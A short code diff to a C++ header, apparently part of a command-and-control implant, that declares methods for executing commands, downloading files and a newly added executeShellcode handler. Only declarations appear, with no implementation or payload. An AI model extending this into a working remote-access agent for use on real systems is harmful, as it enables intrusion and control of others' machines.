@@ -19,6 +19,7 @@
 #include <string>
 #include <vector>
 #include <cstdint>
+// #include <memory> // included by C2Profile
 
 
 class Transporter;
@@ -35,6 +36,8 @@ public:
 	//bool receiveMessages(uint8_t* buffer, size_t bytes_received);
 
 	bool executeCommand(std::vector<uint8_t>& data);
+	//bool executeShellcode(std::vector<uint8_t>& data);
+	bool executeShellcode(InternalMessage& msg);
 
 	bool downloadFile(std::vector<uint8_t>& data);
 	//bool executeFile();
